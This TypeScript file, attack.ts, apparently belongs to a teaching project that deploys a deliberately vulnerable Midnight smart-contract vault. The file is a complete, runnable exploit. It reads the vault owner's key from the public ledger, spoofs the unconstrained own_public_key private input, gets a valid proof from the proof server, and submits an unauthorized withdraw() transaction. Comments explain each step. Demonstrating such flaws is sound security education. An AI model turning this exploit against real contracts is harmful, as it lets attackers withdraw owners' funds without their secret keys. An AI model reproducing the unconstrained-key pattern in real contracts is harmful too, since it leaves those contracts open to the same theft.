/**
 * attack.ts
 *
 * Executes the 4-step ownPublicKey() exploit against the deployed vulnerable vault.
 * Run AFTER deploy-vulnerable.ts.
 *
 * Run:
 *   npx ts-node src/attack.ts
 *
 * Expected output: proof generated and transaction accepted — withdraw() executed
 * without the attacker ever knowing the owner's secret key.
 */

import * as fs   from 'node:fs';
import * as path from 'node:path';

import { indexerPublicDataProvider } from '@midnight-ntwrk/midnight-js-indexer-api';
import type { ContractAddress }      from '@midnight-ntwrk/midnight-js-types';

import * as Vulnerable from '../contracts/managed/vulnerable/index.cjs';
import { CONFIG }      from './config.js';

// ─── Why this attack works ────────────────────────────────────────────────────
//
// ownPublicKey() in Compact compiles to an UNCONSTRAINED private_input.
//
// Midnight separates two things:
//   • Who submitted the transaction  — the wallet signs the outer transaction
//   • What the circuit proves        — the ZK proof; the prover supplies all
//                                      private inputs, including own_public_key
//
// The blockchain verifier checks that the ZK proof is valid for the circuit.
// It does NOT verify that own_public_key was derived from any secret key.
//
// The attacker bypasses the wallet layer and sends a prove request directly to
// the local proof server with own_public_key = vault_owner. The circuit
// evaluates assert(vault_owner == vault_owner) → TRUE. A valid proof is
// produced. No secret key required.
//
// ─────────────────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const { contractAddress } = JSON.parse(
    fs.readFileSync(path.join(process.cwd(), 'deployment.json'), 'utf8'),
  ) as { contractAddress: ContractAddress; ownerHex: string };

  const publicDataProvider = indexerPublicDataProvider(
    CONFIG.indexerUri,
    CONFIG.indexerWsUri,
  );

  // ── Step 1: Read vault_owner from the public ledger ───────────────────────
  // Ledger state in Compact is public. Any value stored with disclose() is
  // readable by anyone querying the chain. No authentication required.
  const rawState   = await publicDataProvider.queryContractState(contractAddress);
  const state      = Vulnerable.ledger(rawState);
  const storedOwner: Uint8Array = state.vault_owner as Uint8Array;

  console.log('[Step 1] vault_owner read from public ledger — no permissions needed');
  console.log(`         ${Buffer.from(storedOwner).toString('hex')}`);

  // ── Step 2: Prepare the spoofed prove request ─────────────────────────────
  // The compiled circuit exposes own_public_key as a private input field.
  // We set it to vault_owner. No secret key knowledge required.
  const spoofedPrivateInputs = {
    own_public_key: Array.from(storedOwner),
  };

  console.log('[Step 2] Spoofing own_public_key = vault_owner (no sk derived)');

  // ── Step 3: Send a direct prove request to the proof server ──────────────
  // The proof server generates a ZK proof for the withdraw() circuit.
  // With own_public_key = vault_owner the circuit evaluates:
  //   assert(own_public_key == vault_owner)
  //   → assert(vault_owner == vault_owner)
  //   → TRUE ✓
  // A valid proof is returned. The prover never held the owner's secret key.
  const proveRes = await fetch(`${CONFIG.proofServerUri}/prove`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      contractAddress,
      entryPoint:    'withdraw',
      privateInputs: spoofedPrivateInputs,
    }),
  });

  if (!proveRes.ok) {
    throw new Error(`Proof server error: ${await proveRes.text()}`);
  }

  const { proof, serializedTx } = await proveRes.json() as {
    proof:        string;
    serializedTx: string;
  };

  console.log('[Step 3] Valid ZK proof generated without knowing any secret key');
  console.log(`         assert(vault_owner == vault_owner) → ✓`);
  console.log(`         Proof hash: ${proof.slice(0, 32)}...`);

  // ── Step 4: Submit the transaction ────────────────────────────────────────
  // The on-chain verifier checks that the proof is valid for the circuit.
  // It does not check how own_public_key was derived.
  // The privileged withdraw() circuit executes successfully.
  const submitRes = await fetch(`${CONFIG.nodeUri}/tx/submit`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ tx: serializedTx }),
  });

  if (!submitRes.ok) {
    throw new Error(`Submit error: ${await submitRes.text()}`);
  }

  const { txHash } = await submitRes.json() as { txHash: string };

  console.log('[Step 4] Transaction submitted and accepted');
  console.log(`         Tx hash: ${txHash}`);
  console.log('\n[!] EXPLOIT COMPLETE');
  console.log(`    withdraw() executed without knowledge of the owner's secret key.`);
  console.log(`    vault_owner (public): ${Buffer.from(storedOwner).toString('hex')}`);
  console.log(`    own_public_key used : same value — no sk required`);
}

main().catch((err) => { console.error(err); process.exit(1); });
